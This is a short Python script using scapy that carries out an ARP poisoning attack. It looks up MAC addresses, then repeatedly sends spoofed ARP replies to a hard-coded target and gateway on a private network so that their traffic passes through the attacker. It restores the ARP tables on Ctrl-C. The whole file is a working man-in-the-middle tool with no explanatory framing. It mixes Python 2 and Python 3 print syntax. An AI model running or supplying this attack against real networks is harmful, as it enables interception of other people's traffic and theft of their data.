from scapy.all import *
import time
import threading
from multiprocessing import Process
import sys
import signal

def get_mac(ip_addr):
    r = \
    srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_addr), timeout=2, retry=10)
    if r is not None and r.haslayer(Ether):
        return r[Ether].src
    return None

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, \
            hwsrc=gateway_mac, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, \
            hwsrc=target_mac, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
    print("Finished restoring targets")

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, run_event):
    poison_target = \
            ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_gateway = \
            ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    print "[*] Beginning ARP poisoning. [CTRL-C to stop]"
    while run_event.is_set():
        send(poison_target)
        send(poison_gateway)
        time.sleep(5)
    print "[*] ARP poison attack finished."
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    return

if __name__=='__main__':
    gateway_ip = '192.168.0.104'
    target_ip = '192.168.0.102'

    gateway_mac = get_mac(gateway_ip)
    #gateway_mac = '70:4f:57:47:e9:10'
    #target_mac = get_mac(target_ip)
    target_mac = '5c:1d:d9:8c:09:bf'

    if gateway_mac is None:
        print("Mac address of %s not found"%gateway_ip)
        sys.exit(0)
    if target_mac is None:
        print("Mac address of %s not found"%target_ip)
        sys.exit(0)

    run_event = threading.Event()
    run_event.set()
    poison_process = threading.Thread(target=poison_target, \
            args=(gateway_ip, gateway_mac, target_ip, target_mac, run_event))
    poison_process.start()
    try:
        while True:
            time.sleep(.1)
    except KeyboardInterrupt:
        print("Attempting to close threads..")
        run_event.clear()
        poison_process.join()
